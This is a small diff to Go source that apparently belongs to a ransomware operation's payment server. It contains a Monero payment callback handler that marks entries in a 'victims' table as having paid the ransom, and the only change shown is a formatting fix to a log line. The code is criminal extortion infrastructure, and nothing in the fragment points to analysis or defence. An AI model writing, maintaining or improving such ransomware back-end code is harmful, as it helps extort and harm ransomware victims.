@@ -44,7 +44,7 @@ func moneroPayCallbackHandler(w http.ResponseWriter, r *http.Request) {
 	// Set ransom paid to true in the database
 	if err := pdbExec(r.Context(),
 	    "UPDATE victims SET paid=true WHERE id=$1", id); err != nil {
-		log.Println("Error setting paid=true:",err)
+		log.Println("Error setting paid=true:", err)
 	}
 }
 
